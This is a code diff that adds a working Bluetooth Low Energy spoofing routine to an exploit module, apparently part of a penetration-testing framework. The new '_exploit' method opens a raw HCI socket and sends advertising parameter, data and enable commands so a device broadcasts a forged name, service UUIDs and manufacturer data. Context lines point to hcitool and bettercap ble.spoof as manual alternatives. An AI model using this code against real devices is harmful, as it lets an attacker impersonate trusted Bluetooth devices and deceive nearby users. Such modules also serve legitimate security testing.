@@ -219,3 +219,45 @@ class Exploit(Exploit):
         print_info(f"  sudo hcitool -i {self.interface} cmd 0x08 0x0008 {len(ad_payload)}...")
         print_info("  Ou usar: bettercap ble.recon; ble.spoof {} {}".format(
             self.target or "TARGET", self.device_name))
+
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E BLE spoofing: send HCI commands to set advertising data and enable."""
+        import socket as _sock
+
+        print_status("BLE Spoofing E2E: sending HCI LE advertising commands")
+        try:
+            hci_sock = _sock.socket(31, _sock.SOCK_RAW, 1)
+            dev_id = int(str(self.interface).replace("hci", "") or "0")
+            hci_sock.bind((dev_id,))
+        except OSError as exc:
+            print_info(f"HCI socket failed: {exc} (use hcitool manually)")
+            return
+
+        uuids = self._parse_uuids()
+        mfg_data = self._parse_mfg_data()
+        ad_payload = _build_advertising_data(
+            name=self.device_name,
+            uuid16_list=uuids,
+            mfg_data=mfg_data,
+            tx_power=int(self.tx_power),
+        )
+
+        interval_units = max(int(self.adv_interval) * 1000 // 625, 0x0020)
+        params_cmd = _build_hci_le_set_adv_params(interval_units, interval_units + 0x0010)
+        data_cmd = _build_hci_le_set_adv_data(ad_payload)
+        enable_cmd = _build_hci_le_set_adv_enable(True)
+
+        for label, cmd in [("Adv Params", params_cmd), ("Adv Data", data_cmd), ("Adv Enable", enable_cmd)]:
+            pkt = struct.pack("B", 0x01) + cmd
+            try:
+                hci_sock.send(pkt)
+                print_status(f"Sent HCI {label} ({len(pkt)} bytes)")
+            except OSError as exc:
+                print_error(f"Failed to send {label}: {exc}")
+                hci_sock.close()
+                return
+
+        hci_sock.close()
+        print_success(f"BLE spoofing active: device appears as '{self.device_name}'")
